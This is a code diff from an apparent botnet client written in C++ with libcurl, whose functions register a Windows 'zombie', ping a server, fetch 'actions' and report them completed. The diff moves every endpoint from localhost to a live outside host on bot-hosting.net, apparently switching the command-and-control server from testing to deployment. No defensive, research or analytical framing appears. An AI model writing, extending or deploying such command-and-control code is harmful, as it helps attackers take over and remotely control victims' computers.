@@ -32,7 +32,7 @@ bool vaev::api::create_zombie()
 
     if (curl)
     {
-        curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:4000/api/v1/zombie/Windows");
+        curl_easy_setopt(curl, CURLOPT_URL, "http://fi4.bot-hosting.net:20021/api/v1/zombie/Windows");
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
 
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_function);
@@ -62,7 +62,7 @@ bool vaev::api::ping()
 
     if (curl)
     {
-        curl_easy_setopt(curl, CURLOPT_URL,  "http://127.0.0.1:4000/api/v1/ping");
+        curl_easy_setopt(curl, CURLOPT_URL,  "http://fi4.bot-hosting.net:20021/api/v1/ping");
         curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
 
         curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
@@ -99,7 +99,7 @@ vaev::action vaev::action::begin()
 
     if (curl)
     {
-        curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:4000/api/v1/action");
+        curl_easy_setopt(curl, CURLOPT_URL, "http://fi4.bot-hosting.net:20021/api/v1/action");
         curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
 
         curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
@@ -137,7 +137,7 @@ bool vaev::action::completed()
 
     if (curl)
     {
-        std::string url = "http://127.0.0.1:4000/api/v1/action/";
+        std::string url = "http://fi4.bot-hosting.net:20021/api/v1/action/";
         url.append(this->e_id.c_str());
 
         curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
